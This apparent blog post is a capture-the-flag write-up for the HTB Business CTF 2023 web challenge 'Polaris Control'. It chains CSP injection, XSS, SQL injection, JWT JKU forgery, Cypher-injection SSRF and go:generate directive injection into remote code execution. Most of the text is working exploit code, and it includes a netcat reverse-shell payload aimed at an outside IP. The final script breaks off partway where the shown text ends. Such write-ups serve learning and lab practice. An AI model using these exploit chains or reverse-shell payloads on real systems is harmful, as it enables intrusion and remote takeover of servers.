---
layout: post
title: HTB Business CTF 2023 - Polaris Control
---

A little while back I competed in the HackTheBox Business CTF 2023 with colleagues from work. I'd like to share my solution for one of the harder challenges, Polaris Control, a "***medium***" (!?) rated web challenge. It involved chaining together multiple separate exploit steps to finally achieve RCE.

---

# Challenge Overview

Polaris Control is based on a hypothetical C2-esque application (reminiscent of SpyBug from HTB CA CTF 2023). It supports go implants/agents which communicate back to the main server with information about whatever host they are infecting through a dedicated API for implants. There is also a user interface accessible past a login page for moderators to examine the collated information of infected hosts. Beyond this there is also administrator only functionality interacting with a neo4j database and a localhost exclusive functionality to build new agents.

# First exploit - CSP Injection to XSS

As we have no credentials to begin with, we will start by examining the agent APIs under `/comms/` which are unauthenticated. This allows us to communicate to the challenge instance by impersonating a remote agent instance.

To achieve this we only need to bypass a trivial check on the User Agent of incoming requests.

```python
# communications.py

...

def implant_middleware(func):
    def check_moderator(*args, **kwargs):
        user_agent = request.headers.get("User-Agent")
        if not current_app.config["IMPLANT_AGENT_NAME"] in user_agent:  # Polaris Control
            return response("Unauthorized"), 401

        return func(*args, **kwargs)

    check_moderator.__name__ = func.__name__
    return check_moderator
...


```

With this requirement met we can make requests to the implant APIs unrestricted. We can register ourselves as an agent, validate our given ID and token, and update our details with `/comms/register`, `/comms/check`, and `/comms/update` respectively. 

The first two are not really that interesting but update definitely is. 

```python
# communications.py

...

@comms.route("/update/<identifier>/<token>", methods=["POST"])
@implant_middleware
def update(identifier, token):
    if not identifier or not token:
        return response("Missing parameters"), 400
    
    if "image" not in request.files:
        return response("No image"), 400
    
    image_file = request.files["image"]

    if image_file.filename == "":
        return response("No selected image"), 400

    if not allowed_file(image_file.filename, current_app.config["ALLOWED_EXTENSIONS"]):  # png
        return response("Invalid image extension"), 403
        
    mysql_interface = MysqlInterface(current_app.config)
    authenticated = mysql_interface.check_implant(identifier, token)   # id and token vlaid
    
    if not authenticated:
         return response("Unauthorized"), 401
        
    data = request.form
    
    if (not "version" in data or 
        not "antivirus" in data or 
        not "arch" in data or 
        not "platform" in data or 
        not "hostname" in data or 
        not "rights" in data
    ):
        return response("Missing parameters"), 400

    image_filename = identifier + "_" + image_file.filename 
    image_file.save(os.path.join(current_app.config["UPLOAD_FOLDER"] + "/", image_filename))

    img_path = current_app.config["UPLOAD_FOLDER"] + "/" + image_filename

    if not check_img(img_path):  # Pillow functions
        os.remove(img_path)
        return response("Invalid image"), 403

    mysql_interface.update_implant(
        identifier,
        request.remote_addr,
        random.choice(regions), 
        data["version"], 
        data["antivirus"], 
        data["arch"], 
        data["platform"], 
        data["hostname"], 
        data["rights"],
        "/static/uploads/" + image_filename
    )
    
    bot_runner(current_app.config["MODERATOR_USER"], current_app.config["MODERATOR_PASSWORD"], current_app.config["BOT_AGENT_NAME"], identifier) # start the bot

    return response("Updated"), 201
```

We can update any of the existing details of the implant but also now upload an image file. There is validation to ensure only the `.png` can be used, and additional checks in the `check_img` function (omitted for brevity) that perform image manipulation via the Pillow library to ensure a validate png is provided.  `os.path.join` is known to be exploitable to strip parts of paths, but we could not find a way in this case because we only control the latter half of the filename via `image_filename = identifier + "_" + image_file.filename `. 

At the end of the function an instance of a moderator user is created via selenium in the `bot_runner` function and made to via the profile of our implant. 

This implies we need to exploit some kind of frontend attack against this bot user to obtain a moderator session. Let's examine `/panel/implant`.

```python
# panel.py

...
@panel.route("/implant/<identifier>", methods=["GET"])
@csp_middleware
@moderator_middleware
def implant(identifier):
    if not identifier:
        return response("Missing parameters"), 400

    mysql_interface = MysqlInterface(current_app.config)
    implant = mysql_interface.fetch_implant_by_identifier(identifier)

    if not implant:
        return response("Implant not found"), 404

    return render_template("implant.html",
        title="Implant information",
        nav_enabled=True,
        user_data=request.user_data,
        implant_data=implant,
    )

...
```

This renders our implant data into the Jinja template `implant.html`, let's take a closer look.

```html
# implant.html
...

<script src="/static/js/implant.js"></script>
<div id="loadingSection" class="loading-container">
    <img class="loading-img" src="/static/images/star.png">
</div>
<div class="container-fluid">
    <div class="row mt-5">
        <div class="col-12">
            <div class="stats-container">
                <div class="row">
                    <div class="col-5">
                        <h2>Information</h2>
                        <hr>
                        <p><b>IP: </b>{{ implant_data['ip_address'] | safe }}</p>
                        <p><b>Region: </b>{{ implant_data['region'] | safe }}</p>
                        <p><b>Version: </b>{{ implant_data['version'] | safe }}</p>
                        <p><b>AV: </b>{{ implant_data['antivirus'] | safe }}</p>
                        <p><b>Architecture: </b>{{ implant_data['arch'] | safe }}</p>
                        <p><b>OS: </b>{{ implant_data['platform'] | safe }}</p>
                        <p><b>Hostname: </b>{{ implant_data['hostname'] | safe }}</p>
                        <p><b>Privileges: </b>{{ implant_data['rights'] | safe }}</p>
                        <p><b>Last seen: </b>{{ implant_data['last_login'] | safe }}</p>
                        <p><b>Installed on: </b>{{ implant_data['installation_date'] | safe }}</p>
                    </div>
                    <div class="col-7">
                        <h2>Screenshot</h2>
                        <hr>
                        <img class="img-fluid" src="{{ implant_data['image_url'] }}">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

...

```

All the implant data is processed with the safe filter, which [prevents](https://tedboy.github.io/jinja2/templ14.html#safe) escaping of its content. This would *normally* give us direct XSS but there is one problem, let's look at the `csp_middleware` decorator on the same API

```python
# panel.py

...
def csp_middleware(func):
    def set_csp(*args, **kwargs):
        pattern = r'/panel/implant/(\w+)'
        match = re.search(pattern, request.url)
        image_url = None

        if match:
            mysql_interface = MysqlInterface(current_app.config)
            image_url = mysql_interface.fetch_implant_by_identifier(match.group(1))["image_url"]

        img_policy = f"'self' {image_url[1:]}" if image_url else "'self'"

        response = make_response(func(*args, **kwargs))
        response.headers["Content-Security-Policy"] = f"default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; img-src {img_policy};"
        return response

    set_csp.__name__ = func.__name__
    return set_csp

...

```

We have a fairly restrictive CSP preventing any immediate XSS. Checking with [CSP evaluator](https://csp-evaluator.withgoogle.com/) the only thing jumping out is the default source: self, but this seems unlikely to exploit given the Pillow functions that run on our uploaded image file. Curiously there is a dynamic aspect to the CSP via `img_policy` string interpolation. 

At this point let's change the moderator credentials on our local instance to let us log in and debug dynamically against on "implant" profile. 

```python
# config.py

class Config(object):
    VERSION = "4.5.0"
    IMPLANT_AGENT_NAME = "Polaris Control"
    IMPLANT_SRC_PATH = "/app/implant"
    IMPLANT_SRC_FILE = "polaris-agent.go"
    BOT_AGENT_NAME = "Polaris Browser"
    SECRET_KEY = generate(50)
    JWKS_PATH = "/tmp/jwks.json"
    UPLOAD_FOLDER = "/app/application/static/uploads"
    ALLOWED_EXTENSIONS = {"png"}
    MYSQL_HOST = os.getenv("MYSQL_HOST")
    MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
    MYSQL_USER = os.getenv("MYSQL_USER")
    MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
    NEO4J_HOST = os.getenv("NEO4J_HOST")
    NEO4J_DATABASE = os.getenv("NEO4J_DATABASE")
    NEO4J_USER = os.getenv("NEO4J_USER")
    NEO4J_PASSWORD = os.getenv("NEO4J_PASSWORD")
    MODERATOR_USER = "moderator"                           # changed
    MODERATOR_PASSWORD = "password"                        # changed

```


We login and navigate to our implant profile. This reveals something (that should really have been apparent on closer code inspection) when looking at the request for our implant in burp.

[![](assets/image/attachments/csp_reflect.png)](assets/image/attachments/csp_reflect.png){:.glightbox}

Our file name is reflected into the CSP via the `{img_policy}` f string variable in `csp_middleware`. Researching this type of behaviour we discover some amazing research by Gareth Heyes on [CSP Policy Injection](https://portswigger.net/research/bypassing-csp-with-policy-injection). I'll not repeat the explanation, so long story short we can use the Chrome CSP injection bypass mentioned in the article since the moderator bot instance is using chrome via selenium.

With an image file name of `"; script-src 'none'; script-src-elem *; img-src blah.png"` we can insert our own CSP directives that create the bypass mentioned in the article. We can verify this bypass by setting a simple alert payload and verifying on our local instance.

We use the following exploit script:

```python
#!/usr/bin/env python3
import requests

local = True
proxy = True

url = "localhost" if local else "94.237.48.19"
port = 1337 if local else 42240

sess = requests.Session()
sess.proxies.update({'http':'http://127.0.0.1:8080'}) if proxy else 0
sess.headers.update({'User-Agent': 'Polaris Control/1.2.3'})

HTTP_SERVER = "http://172.17.0.1:5000" if local else "http://5f65-82-11-229-58.ngrok-free.app"

body = {
        "version":    "a",
                "antivirus":  "b",
                "hostname":   "c",
                "platform":   "d",
                "arch":       "e",
                "rights":     "f"
}

# register our "agent", extract the creds
r = sess.post(f"http://{url}:{port}/comms/register", json=body)

ID = r.json()['identifier']
token = r.json()['token']

# okay check, (required?)
r = sess.get(f"http://{url}:{port}/comms/check/{ID}/{token}")
print(r.text)

js_source = """
alert(1)
"""

with open('./test.js', "w") as fh:
    fh.write(js_source)

body['antivirus'] = f"<script src=\"{HTTP_SERVER}/test.js\"></script>"


# change to your image name
f = "file.png"
with open(f, "rb") as fh:
    r = sess.post(
                f"http://{url}:{port}/comms/update/{ID}/{token}",
                data=body,
                files={
                        # file name will inject into CSP
                        "image": ("blah.png", fh, "text/html")
                }
        )
# debug
print(r.text)

```

And confirm the XSS (if you are following along make sure you open in Chrome)

[![](assets/image/attachments/CSP_inject_confirm.png)](assets/image/attachments/CSP_inject_confirm.png){:.glightbox}

# Second Exploit - SQL Injection

There is no direct account takeover because the session cookie of the moderator is marked as `httpOnly` meaning we have no access with JavaScript, so let's examine what other endpoints we can make a request to in the context of the moderator, endpoints using the moderator middleware.

The obvious choice is `/home`, which accepts user controlled parameter on a POST request

```python
# panel.py

...

@panel.route("/home", methods=["GET", "POST"])
@moderator_middleware
def home():
    server_info = machine_info()
    
    mysql_interface = MysqlInterface(current_app.config)
    statistics = mysql_interface.fetch_implant_statistics()
    
    implants = None
    
    if request.method == "GET":
        implants = mysql_interface.fetch_implant_data()
        
    if request.method == "POST":    
        field = request.form.get("field")
        query_eq = request.form.get("query_eq")
        query_like = request.form.get("query_like")
    
        if not field or not query_eq:
            return response("Missing parameters"), 400
        
        if not query_like:
            query_like = query_eq

        implants = mysql_interface.search_implants(field, query_eq, query_like)
        
    return render_template("home.html", 
        title="Home", 
        nav_enabled=True, 
        user_data=request.user_data, 
        statistics=statistics, 
        implant_data=implants, 
        server_info=server_info
    )

...

```

Let's examine the `search_implants` function our three parameters are used in

```python
# mysql.py

...

    def search_implants(self, column, query_eq, query_like):
        available_columns = [
            "identifier",
            "region",
            "platform",
            "hostname",
            "installation_date"
            "version",
            "antivirus"
        ]

        if not column in available_columns:
            return False

        query_eq = html.escape(query_eq)
        query_like = html.escape(query_like)

        implants = self.query(f"SELECT * FROM implants WHERE {column} = '{query_eq}' OR {column} LIKE '{query_like}%'", multi=True)[0]
        
        
        if len(implants) < 1:
            return False
        
        return implants
...

```

We control all three parameters that are directly interpolated into the query f string. Well, not really with the column since it is a list of fixed values.  `query_eq` and `query_eq` are both placed within single quotes and we will be unable close these with our own single quotes due to the `html.escape` preventing us from using them. 

At this point we should also examine `self.query`.

```python
# mysql.py

...
    def query(self, query, args=(), one=False, multi=False):
        cursor = self.connection.cursor()
        results = None

        if not multi:
            cursor.execute(query, args)
            rv = [dict((cursor.description[idx][0], value)
                for idx, value in enumerate(row)) for row in cursor.fetchall()]
            results = (rv[0] if rv else None) if one else rv
        else:
            results = []
            queries = query.split(";")
            for statement in queries:
                cursor.execute(statement, args)
                rv = [dict((cursor.description[idx][0], value)
                    for idx, value in enumerate(row)) for row in cursor.fetchall()]
                results.append((rv[0] if rv else None) if one else rv)
                self.connection.commit()
    
        return results
...
```

when called with `multi=True` (as is our case) we have some custom logic to implement stacked queries. So if we can find a way to escape the single quote context our params are in we can split with a `;` and run arbitrary SQL commands. 

with `html.escape` we cannot use `< > & '` (maybe others), but we can use `\`. With a `\` in the first parameter we can escape the end single quote so the beginning quote of the next parameter closes it instead turning the string into `'\' OR region LIKE '`, this is explained below:

```sql
// before
SELECT * FROM implants WHERE {column} = '{query_eq}' OR {column} LIKE '{query_like}%'

// column = region
// query_eq = \
// query_like = ; <sql-command> -- -

// after
SELECT * FROM implants WHERE region = '\' OR region LIKE '; <sql-command> -- -'

```

# Third Exploit - JWT JKU Endpoint subversion

With SQL Injection achieved it is not immediately clear *what* to use it for. There is no user with Administrator level privileges created by default so we cannot leak a password hash and try to crack it. The users table has an "account_type" column, so maybe we can insert our own administrator? nope, the table is set as read only during `entrypoint.sh` after initial user creation. The only other path at this point is forging an administrator session somehow so let's look at the session management of the application.

The application uses a JWT based system with asymmetric cryptography and a [JKU](https://webconcepts.info/concepts/jwt-confirmation-method/jku). This is a URI which returns a set of public keys (JWKS set), if the signed JWT can be verified with one of these then it is considered valid. In the case of this application the jku points to `/provider/jwks.json` which hosts the application generated public key. But there is an interesting quirk in the token verification process, the `verify_jwt` function is called with a whitelist parameter of hosts that are treated as "trusted" potential values for the jku, the value for which is verified against this whitelist:

```python
# jwt.py

...

def verify_jwt(whitelist, token):
    decoded_headers = jwt.get_unverified_header(token)

    if "jku" not in decoded_headers:
        return False

    jku_url = decoded_headers["jku"]

    if jku_url not in [host["host_url"] for host in whitelist]:   # checking JWT provided jku against whitelist
        return False

    jwk_set = requests.get(jku_url).json()
    
    public_keys = {}
    for jwk in jwk_set["keys"]:
        kid = jwk["kid"]
        public_keys[kid] = jwt.algorithms.RSAAlgorithm.from_jwk(json.dumps(jwk))

    try:
        decoded_token = jwt.decode(token, key=random.choice(list(public_keys.values())), algorithms=["RS256"])
        return decoded_token
    except jwt.InvalidTokenError:
        return False  
...
```

So where does this whitelist come from? if we track back through calls to `verify_jwt` in the administrator middleware we see it is  `mysql_interface.fetch_token_providers` !

```python
# panel.py
...

def administrator_middleware(func):
	def check_administrator(*args, **kwargs):
		jwt_cookie = request.cookies.get("jwt") or request.args.get("token")
		if not jwt_cookie:
			return response("Unauthorized"), 401
		mysql_interface = MysqlInterface(current_app.config)
		allowed_hosts = mysql_interface.fetch_token_providers()
		token = verify_jwt(allowed_hosts, jwt_cookie)
...

# mysql.py

...

def fetch_token_providers(self):
	providers = self.query("SELECT * FROM trusted_external_token_providers")
	if len(providers) < 1:
		return False
	return providers


```

Great, so we can inject our own whitelisted JKU provider URI allowing us to forge an administrator JWT session! Let's take a step back at this point and look at the exploit steps to reach this point:

1. Upload crafted filename to inject CSP, allowing XSS via implant details.
2. Use XSS to make request to `/panel/home` with crafted request to trigger SQL injection
3. Use SQL injection to set a server we control as a whitelisted JKU provider
4. Generate a private public keypair, sign an administrator JWT with jku header pointing to our approved URL hosting public key
5. Access `/panel/network` to verify administrator access

I've adapted the exploit script to use the application JWT generation logic to avoid any compatibility issues between tools. We can host the public key on the same server as our JS payload and run the below script:

```python
#!/usr/bin/env python3
import requests, jwt, time, base64, json, urllib.parse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


local = True
proxy = True

HTTP_SERVER = "http://172.17.0.1:5000" if local else "http://5f65-82-11-229-58.ngrok-free.app"

url = "localhost" if local else "94.237.48.19"
port = 1337 if local else 42240

sess = requests.Session()
sess.proxies.update({'http':'http://127.0.0.1:8080'}) if proxy else 0
sess.headers.update({'User-Agent': 'Polaris Control/1.2.3'})


body = {
        "version":    "a",
                "antivirus":  "b",
                "hostname":   "c",
                "platform":   "d",
                "arch":       "e",
                "rights":     "f"
}

# register our "agent", extract the creds
r = sess.post(f"http://{url}:{port}/comms/register", json=body)

ID = r.json()['identifier']
token = r.json()['token']

# okay check, (required?)
r = sess.get(f"http://{url}:{port}/comms/check/{ID}/{token}")
print(r.text)


char_string = "char(" + ", ".join([f'{ord(i)}' for i in f'{HTTP_SERVER}/abcdef']) + ")"

# XSS payload
# CSRF to /panel/home with SQLi payload to add new jku provider
js_source = """
var details = {
    'field': 'identifier',
    'query_eq': 'a\\\\',
    'query_like': ';INSERT INTO trusted_external_token_providers(host_url) VALUES(""" + char_string + """)-- -'
};

var formBody = [];
for (var property in details) {
  var encodedKey = encodeURIComponent(property);
  var encodedValue = encodeURIComponent(details[property]);
  formBody.push(encodedKey + "=" + encodedValue);
}
formBody = formBody.join("&");

fetch(`/panel/home`, { 
    method: 'POST', 
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
      },
    body: formBody
})
"""

with open('./test.js', "w") as fh:
    fh.write(js_source)

body['antivirus'] = f"<script src=\"{HTTP_SERVER}/test.js\"></script>"

# change to your image name
f = "file.png"
with open(f, "rb") as fh:
    r = sess.post(
                f"http://{url}:{port}/comms/update/{ID}/{token}", 
                data=body, 
                files={
                        # file name will inject into CSP
                        "image": ("; script-src 'none'; script-src-elem *; img-src blah.png", fh, "text/html")
                }
        )
# debug
print(r.text)

# boilerplate code copied from chal to replicate key gen
private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
)

pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
).decode()

public_numbers = private_key.public_key().public_numbers()
n_base64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()
e_base64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()

jwks = {
        "keys": [
                {
                        "kty": "RSA",
                        "alg": "RS256",
                        "use": "sig",
                        "kid": "1",
                        "n": n_base64,
                        "e": e_base64
                }
        ]
}

with open('./abcdef', "w") as file:
    json.dump(jwks, file)

header = {
        "alg": "RS256",
        "jku": f"{HTTP_SERVER}/abcdef"
}

payload = {
        "username": 'hacked',
        "account_type": 'administrator'
}

token = jwt.encode(payload, pem_private_key, algorithm="RS256", headers=header)

print(f"Token: {token}")

```

Updating the 'jwt' cookie in our browser with the token provided by the script we see we get an administrator session upon browsing to `/panel/network`.

[![](assets/image/attachments/jwtjkuadminhijack.png)](assets/image/attachments/jwtjkuadminhijack.png){:.glightbox}

# Fourth Exploit - Cypher Injection

The next logical step is examining the source code for the endpoint. We see we can control one parameter `query` on a post request that is fed to some neo4j function. 

```python
# panel.py

...
@panel.route("/network", methods=["GET", "POST"])
@administrator_middleware
def network():
    mysql_interface = MysqlInterface(current_app.config)
    neo4j_interface = Neo4jInterface(current_app.config)

    implant_connections = []
    implants = mysql_interface.fetch_implant_data()

    if request.method == "GET":
        implant_connections = neo4j_interface.fetch_implant_connections()

    if request.method == "POST":    
        query = request.form.get("query")
    
        if not query:
            return response("Missing parameters"), 400
        
        implant_connections = neo4j_interface.search_implant_connections(query)

    return render_template("network.html",
        title="Nodes", 
        nav_enabled=True, 
        user_data=request.user_data,
        implant_data=implants,
        connections=implant_connections
    )
...
```

Let's see if we can reach any sink with our input in `search_implant_connections`.

```python
# neo4j.py

...
    def search_implant_connections(self, search_query=None):
        implants = self.query(f"""
        MATCH (i1:Implant)-[:CONNECTED_TO]->(i2:Implant)
        WHERE i1.identifier = '{search_query}' OR i2.identifier = '{search_query}'
        RETURN i1.identifier AS identifier1, i2.identifier AS identifier2
        /*Fetches all connections for a select implant*/
        """)

        connections = []
        for record in implants:
            connection = {
                "identifier1": record["identifier1"],
                "identifier2": record["identifier2"]
            }
            connections.append(connection)

        return connections 
...
```

We have direct string interpolation into the query via `{search_query}`. During the live event this was my first ever encounter with injection into neo4j commands (which I now know as Cypher injection) so I spent a while frantically googling. I relied heavily on these two resources:
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#common-cypher-injections)
- [Pentesterland](https://pentester.land/blog/cypher-injection-cheatsheet/#load-csv)
The exact steps I used to arrive at my final query are a blur now but I recall fixing the return syntax was a requirement, as was using an open inline comment to ignore the rest of the broken query. Also wasting a lot of time trying to use apoc before realising it was not installed....  anyway after this I discovered we can achieve an SSRF with  `LOAD CSV FROM 'https://attacker.com/'`. After a lot of fuzzing and tweaking I discovered we can hit internal endpoints using this method with the following query:
```
' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://127.0.0.1:1234/' as l RETURN 1 as identifier1,2 as identifier2/*
```

confirmed by starting a listener inside the docker container to receive the request:

[![](assets/image/attachments/docker-nc-cathc-neo4j-ssrf.png)](assets/image/attachments/docker-nc-cathc-neo4j-ssrf.png){:.glightbox}


# Fifth Exploit - `go:generate` directive injection

So we have local SSRF, what do we do with it? The target is quite obvious as there is only one endpoint using the `localhost_middleware`, `/panel/server`. It accepts a HTTP GET parameter `server_url` and inputs it to the function `build_implant`

```python
# panel.py

...
@panel.route("/server", methods=["GET"])
@localhost_middleware
@administrator_middleware
def server():
    server_url = request.args.get("server_url")
    
    if not server_url:
        return render_template("server.html",
            title="Builder", 
            nav_enabled=True, 
            user_data=request.user_data,
        )

    return send_file(build_implant(
        current_app.config["IMPLANT_SRC_PATH"], 
        current_app.config["IMPLANT_SRC_FILE"], 
        server_url
    )) 
...

# general.py

...

def build_implant(implant_path, implant_file, server_url):
    implant_id = generate(32)
    new_build_dir = f"/tmp/{implant_id}"

    os.mkdir(new_build_dir)
    os.system(f"cp {implant_path}/* {new_build_dir}")

    implant_file = open(f"{new_build_dir}/{implant_file}", "r")
    implant_src = implant_file.read()
    implant_file.close()
    implant_src = implant_src.replace("SERVER_URL", server_url)

    new_src_path = f"/{new_build_dir}/{implant_id}.go"
    new_src_file = open(new_src_path, "w")
    new_src_file.write(implant_src)
    new_src_file.close()

    os.system(f"go generate -x {new_src_path}")
    os.system(f"go build -C {new_build_dir} -o {new_build_dir}/{implant_id} {new_src_path}")

    return f"{new_build_dir}/{implant_id}"

...

```

This compiles a new implant with the server URL we provide directly replaced into the implant source code. 

```go
// polaris_agent.go

...

func main() {
	const version = "3.12.5"
	const userAgent = "Polaris Control/" + version
	const configPath string = "/tmp/polaris.conf"
	const screenshotPath string = "/tmp/screenshot.png"
	const apiURL string = "SERVER_URL"                       // SERVER_URL will be replaced!

	var apiConnection bool = checkConnection(apiURL)

	if apiConnection {
		var configFileExists bool = checkFile(configPath)
...
```

Essentially we can cause arbitrary go code to be compiled - what do we do with this? Some further research into the command called, `go generate` revealed the [`//go:generate` directive](https://blog.carlmjohnson.net/post/2016-11-27-how-to-use-go-generate/). 

> The `go generate` command was added in [Go 1.4](https://golang.org/doc/go1.4#gogenerate), “**to automate the running of tools** to generate source code before compilation.”

This sounds like exactly what we are looking for. After quickly verifying the container for this challenge contains the `-e` variant of netcat we can build our payload. We need the directive to be at the beginning of a new line to function correctly, so we will close the quotes, take a newline, enter our directive, take another newline and start a comment to ignore the trailing quote, like so:

`server_url` payload
```
"
//go:generate nc 172.19.0.1 1234 -e /bin/sh
//
```

which when replaced into the go code with `SERVER_URL`, will look like this:

```go
func main() {
	const version = "3.12.5"
	const userAgent = "Polaris Control/" + version
	const configPath string = "/tmp/polaris.conf"
	const screenshotPath string = "/tmp/screenshot.png"
	const apiURL string = ""
//go:generate nc 172.19.0.1 1234 -e /bin/sh
//"                       

	var apiConnection bool = checkConnection(apiURL)

	if apiConnection {
		var configFileExists bool = checkFile(configPath)
```

Now to build the final payload. We can set the `server_url` payload as above and thankfully the `@administrator_middleware` has been configured to also accept the JWT token as a HTTP GET parameter  (`jwt_cookie = request.cookies.get("jwt") or request.args.get("token")`), so we provide that also. This gives us a Cypher Injection payload as follows:

```
query=' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://127.0.0.1:1337/panel/server?server_url="\n//go:generate nc 139.162.169.46 4567 -e /bin/sh\n//&token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vMmMwNC04Mi0xMS0yMjktNTgubmdyb2stZnJlZS5hcHAvYWJjZGVmIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImhhY2tlZCIsImFjY291bnRfdHlwZSI6ImFkbWluaXN0cmF0b3IifQ.CZ6cSbrA8HHc8y8s1gnNolL3Oe4oUcPPTSCMNiPNQF6VpUsFwoHPgMv_V5RwgDcND17Dqolr5G1lRwUdhzj-SGzm3yymwdB-LTWVLu7FQrnVzj1yIjgJRDWoFZJDQI4m4Jp44VQW24KuKneCuVGRFu86DUMFnyCwjDZB-lK-YPPLia4q2yQGSER9PHSD6aYCTIF8ksNbpJcHTRfjTf10UPIeFS35itfyYV4z6R-X6IG2FKgJIVkNPb5rwmIp5J4-inruCTa2-YiXmJWgAY-EGFepRkb1iA2_X-oBxnSgvHB_RYoBIDxpnz7_qr3XWxiLvHQYqhgfmCHFPNivSTIIfg' as l RETURN 1 as identifier1,2 as identifier2/*
```

Note however that we will need to URL encode the `server_url` value twice, once for POST body to `/panel/network` for the cypher injection, and then again for the SSRF to `/panel/server`. 

```
# URL Encode server_url
query=' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://127.0.0.1:1337/panel/server?server_url=%22%0A%2F%2Fgo%3Agenerate%20nc%20139%2E162%2E169%2E46%204567%20%2De%20%2Fbin%2Fsh%0A%2F%2F&token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vMmMwNC04Mi0xMS0yMjktNTgubmdyb2stZnJlZS5hcHAvYWJjZGVmIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImhhY2tlZCIsImFjY291bnRfdHlwZSI6ImFkbWluaXN0cmF0b3IifQ.CZ6cSbrA8HHc8y8s1gnNolL3Oe4oUcPPTSCMNiPNQF6VpUsFwoHPgMv_V5RwgDcND17Dqolr5G1lRwUdhzj-SGzm3yymwdB-LTWVLu7FQrnVzj1yIjgJRDWoFZJDQI4m4Jp44VQW24KuKneCuVGRFu86DUMFnyCwjDZB-lK-YPPLia4q2yQGSER9PHSD6aYCTIF8ksNbpJcHTRfjTf10UPIeFS35itfyYV4z6R-X6IG2FKgJIVkNPb5rwmIp5J4-inruCTa2-YiXmJWgAY-EGFepRkb1iA2_X-oBxnSgvHB_RYoBIDxpnz7_qr3XWxiLvHQYqhgfmCHFPNivSTIIfg' as l RETURN 1 as identifier1,2 as identifier2/*

# URL Encode everything
query=%27%20OR%201%3D1%20WITH%201%20as%20%5Fl00%20CALL%20dbms%2Eprocedures%28%29%20yield%20name%20LOAD%20CSV%20FROM%20%27http%3A%2F%2F127%2E0%2E0%2E1%3A1337%2Fpanel%2Fserver%3Fserver%5Furl%3D%2522%250A%252F%252Fgo%253Agenerate%2520nc%2520139%252E162%252E169%252E46%25204567%2520%252De%2520%252Fbin%252Fsh%250A%252F%252F%26token%3DeyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vMmMwNC04Mi0xMS0yMjktNTgubmdyb2stZnJlZS5hcHAvYWJjZGVmIiwidHlwIjoiSldUIn0%2EeyJ1c2VybmFtZSI6ImhhY2tlZCIsImFjY291bnRfdHlwZSI6ImFkbWluaXN0cmF0b3IifQ%2ECZ6cSbrA8HHc8y8s1gnNolL3Oe4oUcPPTSCMNiPNQF6VpUsFwoHPgMv%5FV5RwgDcND17Dqolr5G1lRwUdhzj%2DSGzm3yymwdB%2DLTWVLu7FQrnVzj1yIjgJRDWoFZJDQI4m4Jp44VQW24KuKneCuVGRFu86DUMFnyCwjDZB%2DlK%2DYPPLia4q2yQGSER9PHSD6aYCTIF8ksNbpJcHTRfjTf10UPIeFS35itfyYV4z6R%2DX6IG2FKgJIVkNPb5rwmIp5J4%2DinruCTa2%2DYiXmJWgAY%2DEGFepRkb1iA2%5FX%2DoBxnSgvHB%5FRYoBIDxpnz7%5Fqr3XWxiLvHQYqhgfmCHFPNivSTIIfg%27%20as%20l%20RETURN%201%20as%20identifier1%2C2%20as%20identifier2%2F%2A
```

With this we a finally ready to perform the exploit. We start a local netcat listener on port 1234 and send the above payload to `/panel/network`.

[![](assets/image/attachments/polaris_rce_proof.png)](assets/image/attachments/polaris_rce_proof.png){:.glightbox}

### Recap
Altogether we chained quite a number of vulnerabilities to get RCE:
- CSP Injection via uploaded filename to neutralize CSP
- Allowing XSS via `| safe` entry in flask template
- Using XSS to send request as moderator user to `/panel/home` triggering SQLi
- Using SQLi to set poison JKU provider with our controlled JWKS 
- Signing our own JWT with this and using poisoned JKU provider endpoint to verify
- Exploiting Cypher Injection to trigger SSRF via `LOAD CSV`
- Using SSRF to hit localhost only endpoint `/panel/server`
- Using this endpoint to inject go directives into go source code, and cause RCE during `go generate`

Here is the full script to complete the exploit:

```python
#!/usr/bin/env python3
import requests, jwt, time, base64, json, urllib.parse
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


"""
Exploit requirements:
1. get a random png named file.png, place in current directory
2. HTTP server to js and jku pub key
3. TCP listener for reverse shell

"""

local = True
proxy = True

HTTP_SERVER = "http://172.17.0.1:5000" if local else "http://5f65-82-11-229-58.ngrok-free.app"

listener_ip = "172.17.0.1" if local else "tcp://5f65-82-11-229-58.ngrok-free.app"
listener_port = "1234" if local else "80"

url = "localhost" if local else "94.237.48.19"
port = 1337 if local else 42240

sess = requests.Session()
sess.proxies.update({'http':'http://127.0.0.1:8080'}) if proxy else 0
sess.headers.update({'User-Agent': 'Polaris Control/1.2.3'})


body = {
        "version":    "a",
		"antivirus":  "b",
		"hostname":   "c",
		"platform":   "d",
		"arch":       "e",
		"rights":     "f"
}

# register our "agent", extract the creds
r = sess.post(f"http://{url}:{port}/comms/register", json=body)

ID = r.json()['identifier']
token = r.json()['token']

# okay check, (required?)
r = sess.get(f"http://{url}:{port}/comms/check/{ID}/{token}")
print(r.text)


char_string = "char(" + ", ".join([f'{ord(i)}' for i in f'{HTTP_SERVER}/pub.json']) + ")"

# XSS payload
# CSRF to /panel/home with SQLi payload to add new jku provider
js_source = """
var details = {
